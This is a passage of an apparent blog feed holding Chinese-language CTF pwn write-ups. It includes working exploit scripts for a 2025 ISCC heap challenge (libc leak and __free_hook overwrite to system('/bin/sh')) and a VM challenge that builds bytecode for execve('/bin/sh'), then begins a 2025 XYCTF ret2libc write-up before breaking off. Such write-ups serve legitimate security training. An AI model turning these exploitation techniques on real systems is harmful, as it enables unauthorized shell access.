&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x0017A0</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment">#----------------------heap_menu--------------------------</span></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt;&quot;</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content = <span class="string">b&quot;xidp&quot;</span></span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line">    sda(<span class="string">&quot;Enter name (up to 24 chars):&quot;</span>, content)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sda(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content = <span class="string">&quot;xidp&quot;</span></span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sda(<span class="string">&quot;New name:&quot;</span>, content)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>(<span class="params">payload</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sda(<span class="string">&quot;Game started! (WASD to move, Q to quit)&quot;</span>, payload)</span><br><span class="line"><span class="comment">#--------------------------heap_menu--------------</span></span><br><span class="line"></span><br><span class="line">game_payload = <span class="string">&quot;ddsdddssdddddddsssdssddsdddssssddssssdssssddddddssdddsdsdsdssssssssddsssssddsssdsssssssssssddddssssddssssdsdssdssddssssssssssddddsssssdsddddsssdddddddsssdsssdddsdddsssssdsdsdddsddddsssssdssdddddsssssddddsdddsdsdddddddddddddsssdssssdddsdsddddddsddddddssdddsq&quot;</span></span><br><span class="line">  </span><br><span class="line">add() <span class="comment"># 这里需要创建一个初始chunk后续才能进入game中</span></span><br><span class="line">game(game_payload)</span><br><span class="line">read_addr = uu64()</span><br><span class="line">leak(<span class="string">&quot;read_addr&quot;</span>)</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 倒序释放将tcahcebins的0x30填满</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这会修改usrs[0]的低三位+1，从而导致bins结构发生重叠</span></span><br><span class="line">game(<span class="string">&quot;sq&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">6</span>, payload)</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">add(p64(system_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">6</span>, payload)</span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/41.png"></p><h3 id="mini-pwn"><a href="#mini-pwn" class="headerlink" title="mini pwn"></a>mini pwn</h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/42.png"></p><p><code>我干啊，又是VM pwn</code></p><p>程序开始时qword_40C0为1<br>Case5中有一个syscall，我们可以构造execve(“&#x2F;bin&#x2F;sh”, 0, 0),构造之前需要设置qword_40C0为0<br>在case3中，开始就会将qword_40C0设置为0， 随后会执行如下图字节码，<br>它将设置系统调用号为0，然后执行syscall，再自动执行case 4<br>Case4中，会判断v5 &#x3D; *(qword_4060 + 4024) &#x3D;&#x3D; 0;，通过判断结果来重新设置LOBYTE(qword_40C0) &#x3D; !v5;在默认情况下qword_40C0会被设置为1，所以可以利用程序中的机器码unk_20B4 来构造read（0， <em>(qword_4060 + 4024)， 0x100）从而使得</em>(qword_4060 + 4024) &#x3D;&#x3D; 0;成立，使得v5为1，最终得到qword_40C0为0，随后就可以利用syscall来构造execve(“&#x2F;bin&#x2F;sh”, 0, 0),从而得到shell</p><p>抽象exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:24000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">opcodes = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">operands = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg0</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg0_8</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg1</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg1_8</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg2</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg3_8</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop_reg3</span>(<span class="params">imm</span>):</span><br><span class="line">    <span class="keyword">global</span> opcodes, operands</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    operands += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, imm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg0</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg0_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg1</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg1_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg2</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg3_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_reg3</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">2</span>, <span class="number">6</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg0</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg0_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg1</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg1_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg2</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg3_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_reg3</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">6</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg0</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg0_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg1</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg1_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg2</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg3_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_reg3</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">7</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg0</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg0_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg1</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg1_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg2</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg3_8</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_reg3</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;bb&quot;</span>, <span class="number">8</span>, <span class="number">6</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;b&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sys</span>():</span><br><span class="line">    <span class="keyword">global</span> opcodes</span><br><span class="line">    opcodes += struct.pack(<span class="string">&quot;&lt;b&quot;</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虽然上面定义了很多函数，但是实际用到的没几个</span></span><br><span class="line">pop_reg0(<span class="number">0x3b</span>)  </span><br><span class="line">pop_reg1_8(<span class="number">0x8</span>) <span class="comment"># read(0, flag, 0x10)  --&gt; reg1_8=0x10</span></span><br><span class="line">push_reg3()  </span><br><span class="line">pop_reg1(<span class="number">1</span>)  </span><br><span class="line">[add_reg1() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1014</span>)]       <span class="comment"># reg1=flag_addr</span></span><br><span class="line">flag()</span><br><span class="line">push_reg3()    </span><br><span class="line">pop_reg0_8(<span class="number">1</span>)</span><br><span class="line">[add_reg0_8() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">xor_reg1()</span><br><span class="line">xor_reg1_8()</span><br><span class="line">xor_reg2()</span><br><span class="line">sys()</span><br><span class="line">xor_reg3()</span><br><span class="line">operands += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sdl(operands)</span><br><span class="line">sdl(opcodes)</span><br><span class="line">sdl(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/43.png"></p><h2 id="未解出"><a href="#未解出" class="headerlink" title="未解出"></a>未解出</h2><p><code>太多了，实在是打不动了，有空再复现吧，如果有师傅做出来下面我没有解出的题目非常欢迎来和我交流</code></p><h3 id="命令执行器"><a href="#命令执行器" class="headerlink" title="命令执行器"></a><strong>命令执行器</strong></h3><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a><strong>复读机</strong></h3><h3 id="安全云盘"><a href="#安全云盘" class="headerlink" title="安全云盘"></a><strong>安全云盘</strong></h3><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 XYCTF Pwn-wp(含附件)</title>
      <link href="/2025/06/13/2025%20XYCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/"/>
      <url>/2025/06/13/2025%20XYCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>总体来说Pwn方向题目难度属于中等,属于那种一眼看不出要咋做,但多试试又能做出来的那种,比赛的时候甚至有几只队伍AK了Pwn方向。感觉题目还是很不错的尽管比赛中有一些小意外像是有些题目附件给错了，但是XYCTF的师傅们都是无偿出题纯热爱向大伙分享自己的题目和知识，感谢所有XYCTF出题的师傅，明年我还来打<code>(〃&#39;▽&#39;〃)</code></p><p>通过网盘分享的文件：2025XYCTF.rar<br>链接: <a href="https://pan.baidu.com/s/1yf7piV-H4U2qtXiQyo9eBw?pwd=xidp">https://pan.baidu.com/s/1yf7piV-H4U2qtXiQyo9eBw?pwd=xidp</a> 提取码: xidp<br>其中含有pwn方向全部赛题、官方wp、奶龙出题人提供的奶龙wp以及ddw队伍的师傅分享在群里的pwn方向全解wp</p><h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a><strong>Ret2libc’s Revenge</strong></h3><p>第一次遇到这种题目，刚打开就感觉很奇怪，以往做过的绝大多数题目都是利用<code>setvbuf函数</code>关闭缓冲区来达到直接输入&#x2F;输出的效果，但是这个题目特意将输出的缓冲区开启了，导致正常情况下之后程序结束刷新了缓冲区才会有输出，具体如下图所示:<br><img src="/../picture/2025XYCTFpwn-wp/1.png"><br><img src="/../picture/2025XYCTFpwn-wp/2.png"><br>下图展示setvbuf函数的作用:<br><img src="/../picture/2025XYCTFpwn-wp/3.png"><br>而我们运行程序可以看到我们需要先输入，等程序结束后才会有输出<br><img src="/../picture/2025XYCTFpwn-wp/4.png"><br>而原本输出的内容会优先存放在一个堆空间中，这个就是我们说的缓冲区<br><img src="/../picture/2025XYCTFpwn-wp/5.png"><br>看到这道题原本我的思路是再次构造<code>setvbuf函数</code>来关闭输出的缓冲区，然后利用程序中的<code>数组溢出</code>来构造<code>ROP</code>泄露<code>libc基地址</code>，但是多次尝试后失败了，因为程序中所能够使用的<code>gadget</code>太少了，没办法合理的控制<code>rcx寄存器</code>，并且程序中也没有含有<code>fflush函数</code>最终使得我的思路是<code>将输出缓冲区填满</code>，来<code>泄露libc基地址</code>然后打<code>ret2libc</code>(毕竟这个题目叫ret2libc的复仇)<br>还需要注意题目是<code>数组溢出</code>，覆盖的时候不要无脑覆盖，需要通过调试确定<code>idx变量</code>在栈中的位置，需要把<code>idx变量</code>覆盖成合理的大小，不然就没办法覆盖到下面的数据，或者由于<code>idx变量</code>被覆盖成奇怪的数据而到处乱覆盖</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span 